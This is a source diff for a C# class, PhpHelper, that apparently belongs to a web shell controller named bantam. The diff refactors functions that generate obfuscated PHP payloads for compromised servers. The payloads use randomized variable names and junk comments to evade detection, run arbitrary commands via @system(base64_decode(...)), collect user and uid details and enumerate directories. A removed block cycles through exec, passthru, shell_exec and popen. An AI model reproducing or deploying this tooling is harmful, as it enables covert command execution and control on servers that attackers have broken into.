@@ -3,7 +3,7 @@ using System.Text;
 
 namespace bantam.Classes
 {
-    class PhpHelper
+    static class PhpHelper
     {
         /// <summary>
         /// 
@@ -54,8 +54,8 @@ namespace bantam.Classes
         /// <returns></returns>
         public static string RandomPHPVar(int maxNum = 16)
         {
-            int length = Helper.RandomNumber(maxNum);
-            return "$" + Helper.RandomString(1, true) + Helper.RandomString(maxNum - 1, true, true);
+            int randomLength = Helper.RandomNumber(maxNum-1);
+            return "$" + Helper.RandomString(1, true) + Helper.RandomString(randomLength, true, true);
         }
 
         /// <summary>
@@ -65,8 +65,8 @@ namespace bantam.Classes
         /// <returns></returns>
         public static string RandomPHPComment(int maxNum = 32)
         {
-            int length = Helper.RandomNumber(maxNum);
-            return "/*" + Helper.RandomString(length, true, true) + "*/";
+            int randomLength = Helper.RandomNumber(maxNum);
+            return "/*" + Helper.RandomString(randomLength, true, true) + "*/";
         }
 
         /// <summary>
@@ -155,7 +155,7 @@ namespace bantam.Classes
             string phpVersionVar = RandomPHPVar();
 
             string responseCode = string.Empty;
-            StringBuilder sb = new StringBuilder();
+            StringBuilder linesRandomized = new StringBuilder();
 
             //order of these lines don't matter so we shuffle them around
             List<string> shuffleableLines = new List<string> {
@@ -175,7 +175,7 @@ namespace bantam.Classes
             Helper.ShuffleList(shuffleableLines);
 
             foreach (var line in shuffleableLines) {
-                sb.Append(line + RandomPHPComment());
+                linesRandomized.Append(line + RandomPHPComment());
             }
 
             if (encryptResponse) {
@@ -198,7 +198,7 @@ namespace bantam.Classes
                      + "'." + groupVar + ".'" + g_delimiter
                      + "'." + phpVersionVar + ";";
 
-            return sb
+            return linesRandomized
                 + "if (!function_exists('posix_getegid')) {" + RandomPHPComment()
                 + userVar + " = @get_current_user();" + RandomPHPComment()
                 + uidVar + " = @getmyuid();" + RandomPHPComment()
@@ -442,32 +442,6 @@ namespace bantam.Classes
         }
 
         /// <summary>
-        /// Todo make a user controlled feature as to which function to use, but also use this and call it the something something method
-        /// </summary>
-        /// <param name="code"></param>
-        /// <returns></returns>
-        //    public static string executeSystemCode(string code)
-        //    {
-        //  return @"
-        //        if (function_exists('exec')) {
-        //            @exec($in, $out);
-        //   echo @out;
-        //        } elseif(function_exists('passthru')) {
-        //            @passthru($in);
-        //        } elseif(function_exists('system')) {
-        //            @system($in);;
-        //        } elseif(function_exists('shell_exec')) {
-        //   echo @shell_exec($in);
-        //        } elseif(is_resource($f = @popen($in, 'r'))) {
-        //   $out = "";
-        //            while (!@feof($f))
-        //$out .= fread($f, 1024);
-        //            pclose($f);
-        //            echo $out;
-        //        }";
-        //    }
-
-        /// <summary>
         /// 
         /// </summary>
         /// <param name="code"></param>
@@ -475,15 +449,15 @@ namespace bantam.Classes
         /// <returns></returns>
         public static string ExecuteSystemCode(string code, bool encryptResponse)
         {
-            code = Helper.EncodeBase64ToString(code);
+            string b64Code = Helper.EncodeBase64ToString(code);
             if (encryptResponse) {
                 return RandomPHPComment()
                     + "@ob_start();" + RandomPHPComment()
-                    + "@system(base64_decode('" + code + "'));" + RandomPHPComment()
+                    + "@system(base64_decode('" + b64Code + "'));" + RandomPHPComment()
                     + "$result = @ob_get_contents();" + RandomPHPComment()
                     + "@ob_end_clean();" + RandomPHPComment();
             } else {
-                return RandomPHPComment() + "@system(base64_decode('" + code + "'));" + RandomPHPComment();
+                return RandomPHPComment() + "@system(base64_decode('" + b64Code + "'));" + RandomPHPComment();
             }
         }
 
@@ -493,32 +467,27 @@ namespace bantam.Classes
         /// <param name="location"></param>
         /// <param name="phpVersion"></param>
         /// <returns></returns>
-        public static string DirectoryEnumerationCode(string location, string phpVersion, bool responseEncryption)
+        public static string DirectoryEnumerationCode(string location, string phpVersion, bool encryptResponse)
         {
             string varItem = RandomPHPVar();
+            string responseCode = string.Empty;
 
-            if (responseEncryption) {
-                return RandomPHPComment()
-                 + @"$result='';"
-                 + @" try{ " + RandomPHPComment()
-                 + @"foreach (new DirectoryIterator('" + location + @"') as " + varItem + @") {" + RandomPHPComment()
-                 + @"$result .= " + varItem + "->getBasename().'" + g_delimiter + "'."
-                        + varItem + "->getPath().'" + g_delimiter + "'."
-                        + "((" + varItem + "->isFile()) ? " + varItem + "->getSize() : '').'" + g_delimiter + "'."
-                        + "((" + varItem + "->isFile()) ? 'file' : 'dir').'" + g_delimiter + "'."
-                        + varItem + @"->getPerms().'" + rowSeperator + @"';" + RandomPHPComment() + @"
-		            }}catch(Exception $e){ }" + RandomPHPComment();
+            if (encryptResponse) {
+                responseCode = "$result = ";
             } else {
-                return RandomPHPComment()
-                 + @" try{ " + RandomPHPComment()
-                 + @"foreach (new DirectoryIterator('" + location + @"') as " + varItem + @") {" + RandomPHPComment()
-                 + @"echo " + varItem + "->getBasename().'" + g_delimiter + "'."
+                responseCode = "echo ";
+            }
+
+            return RandomPHPComment()
+                + "$result='';"
+                + "try {" + RandomPHPComment()
+                    + "foreach (new DirectoryIterator('" + location + "') as " + varItem + ") {" + RandomPHPComment()
+                        + responseCode + varItem + "->getBasename().'" + g_delimiter + "'."
                         + varItem + "->getPath().'" + g_delimiter + "'."
                         + "((" + varItem + "->isFile()) ? " + varItem + "->getSize() : '').'" + g_delimiter + "'."
                         + "((" + varItem + "->isFile()) ? 'file' : 'dir').'" + g_delimiter + "'."
-                        + varItem + @"->getPerms().'" + rowSeperator + @"';" + RandomPHPComment() + @"
-		            }}catch(Exception $e){ }" + RandomPHPComment();
-            }
+                        + varItem + "->getPerms().'" + rowSeperator + "';" + RandomPHPComment() + 
+                "}}catch(Exception $e){ }" + RandomPHPComment();
         }
 
         /// <summary>
